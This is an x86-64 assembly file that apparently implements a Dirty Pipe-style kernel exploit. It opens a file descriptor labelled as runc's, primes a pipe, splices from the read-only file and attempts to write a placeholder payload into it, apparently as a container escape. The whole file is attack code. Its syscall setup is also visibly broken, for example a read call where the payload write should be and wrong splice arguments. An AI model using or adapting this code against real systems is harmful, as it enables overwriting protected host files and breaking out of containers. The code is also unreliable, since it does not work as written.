global _start

section .text

_start:
    call main

main:
    sub rsp, 8+65536

; *******************
; open
; get runc's fd
; *******************
open:
    mov rax, SYS_OPEN
    mov rdx, 0
    mov rsi, O_RDONLY                          ;flags
    mov rdi, runc                                       ;filename
    syscall

    cmp     rax, 0                                        ; check for success
    jl      errorOnOpen
    mov qword [fileDesc], rax        

; *******************
; prepare_pipe
; *******************
prepare_pipe:
    mov rax, SYS_PIPE
    lea rdi, [rsp+8]                                       ; p
    syscall

; *******************
; write
; init pipe with 65536
; *******************
write: 
    mov rax, SYS_WRITE
    mov rdx, PAGE_SIZE
    mov rsi, [rsp+8+65536]                                ;buffer
    mov rdi, [rsp+4]                                ; p[1]
    syscall

; *******************
; read
; init pipe with 65536
; *******************
read: 
    mov rdx, PAGE_SIZE
    lea rsi,  [rsp+8+65536]                         ;buffer
    lea rdi,  [rsp+8]                          ; p[0]
    mov rax, SYS_READ
    syscall

; *******************
; splice
; *******************
splice: 
    mov r9, 0                                                     ; flags
    mov r8, 1                                                     ; len
    mov rcx, NULL                                           ; off_out
    lea rdi, [rsp+4]                                                    ; p[1]
    mov rsi,   0                                                  ; offset
    mov rdi,  qword [fileDesc]                          ; fd
    mov rax, SYS_SPLICE
    syscall

; *******************
; write_payload
; 
; *******************
write_payload: 
    mov rdx, MAX_LENGTH                                ; length
    mov rsi,   payload                                             ; payload
    lea rdi, [rsp+4]                                       ; p[1]
    mov rax, SYS_READ
    syscall

; *******************
; exit
; *******************
exit:
    mov       rax, SYS_EXIT
    xor       rdi, rdi                      ; exit code 0
    syscall                               ; invoke operating system to exit

; *******************
; errorOnOpen
; *******************
errorOnOpen:
    mov    rdi, errMsgOpen 
    call     printString
    call     exit

; *******************
; printString
; *******************
printString:
    push    rbp
    mov     rbp, rsp 
    push    rbx
    ;  Count characters in string.
    mov     rbx, rdi
    mov     rdx, 0 
strCountLoop:
    cmp     byte [rbx], NULL 
    je      strCountDone     
    inc     rdx
    inc     rbx
    jmp     strCountLoop
strCountDone:
    cmp     rdx, 0 
    je      prtDone
    ;  Call OS to output string.
    mov     rax, SYS_WRITE                 ; code for write ()
    mov     rsi, rdi                                   ; addr of characters
    mov     rdi, STDOUT                        ; file descriptor
                                                             ; count set above
    syscall                                               ; system call
prtDone:
    pop     rbx
    pop     rbp 
    ret 

section .data
    ; ********syscall*******
    SYS_READ:                   equ 0
    SYS_WRITE:                  equ 1
    SYS_OPEN:                   equ 2
    SYS_PIPE:                   equ 22
    SYS_EXIT:                       equ 60
    SYS_SPLICE:                 equ 275
    ; ********flag*******
    LF                                  equ    10            ; line feed
    NULL                            equ    0             ; end of string
    STDOUT:                       equ 1
    O_RDONLY           equ    000000q        ; read only
    BUFF_SIZE          equ 255
    PAGE_SIZE           equ 4096
    MAX_LENGTH equ 4095
    ; ********string*******
    runc db '/tmp/fd',NULL ; runc fd
    writeDone      db       "Write Completed.", LF, NULL
    errMsgWrite    db       "Error writing to file.", LF, NULL
    errMsgOpen         db    "Error opening the file.", LF, NULL
    errMsgRead         db    "Error reading from the file.", LF, NULL
    fileDesc       dq       0
    payload db "st0n3st0n3st0n3"

section    .bss
readBuffer resb     BUFF_SIZE
